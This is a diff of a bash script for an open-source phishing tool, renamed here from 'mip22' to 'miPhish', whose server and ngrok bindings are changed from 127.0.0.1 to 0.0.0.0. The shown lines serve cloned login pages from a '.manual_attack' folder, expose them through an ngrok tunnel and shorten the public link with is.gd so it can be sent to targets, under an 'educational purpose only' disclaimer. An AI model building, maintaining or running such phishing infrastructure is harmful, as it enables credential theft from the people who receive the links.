@@ -3,14 +3,14 @@
 
 #
 #  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
-#  mip22 is a advanced phishing tool.
+#  miPhish is a advanced phishing tool.
 #
-#  mip22 is free software: you can redistribute it and/or modify
+#  miPhish is free software: you can redistribute it and/or modify
 #  it under the terms of the GNU Affero General Public License as published by
 #  the Free Software Foundation, either version 3 of the License, or
 #  (at your option) any later version.
 #
-#  mip22 is distributed in the hope that it will be useful,
+#  miPhish is distributed in the hope that it will be useful,
 #  but WITHOUT ANY WARRANTY; without even the implied warranty of
 #  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 #  GNU Affero General Public License for more details.
@@ -159,7 +159,7 @@ ${BLUE}  ██║██║╚██╔╝██║██╔═══╝ ██�
 ${BLUE}  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████║███████║██║██████╔╝███████╗███████╗███████║   dP   dP
 ${BLUE}  ═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝   d888 d888 
 ${BLUE}                                                                                         
-        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 3.3  
+        ${CYAN}miPhish tool made for educational purpose only. 	${ORANGE}Version: 3.3  
         ${CYAN}The author is not responsible for any malicious use of the program.
 		${CYAN}        Mip Created by ${ORANGE}makdosx ${CYAN}(https://github.com/makdosx) ${WHITE}
 	
@@ -192,7 +192,7 @@ $bold          _|
 
 
 # Php webserver and port 
-host='127.0.0.1'
+host='0.0.0.0'
 port='8080'
 
 
@@ -490,7 +490,7 @@ ngrok_start() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
     url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -521,7 +521,7 @@ ngrok_start_customize() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
     url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -552,7 +552,7 @@ ngrok_start_manual() {
 
 	{ sleep 9; clear; header; }
 	
-	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url=$(curl -s -N http://0.0.0.0:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
 	
 	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
@@ -841,8 +841,8 @@ tunnel_customize() {
 
 start_manual_method() {
  
- cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
-     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://127.0.0.1:8081 ${GREEN} for setup clone page "${WHITE}
+ cd .manual_attack && php -S "0.0.0.0:8081" > /dev/null 2>&1 & 
+     echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} Visit ${WHITE} http://0.0.0.0:8081 ${GREEN} for setup clone page "${WHITE}
 	 echo -e "\n${GREEN}[${WHITE}-${GREEN}] ${GREEN} After setup clone page return to here and continue... "${WHITE}
 
 }
@@ -1724,7 +1724,7 @@ menu() {
 	    help) help;;
 	      				
 		0)
-		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using mip22 "${WHITE}
+		echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${ORANGE} Thanks for using miPhish "${WHITE}
 		sleep 2
 		clear
 		exit 1;;
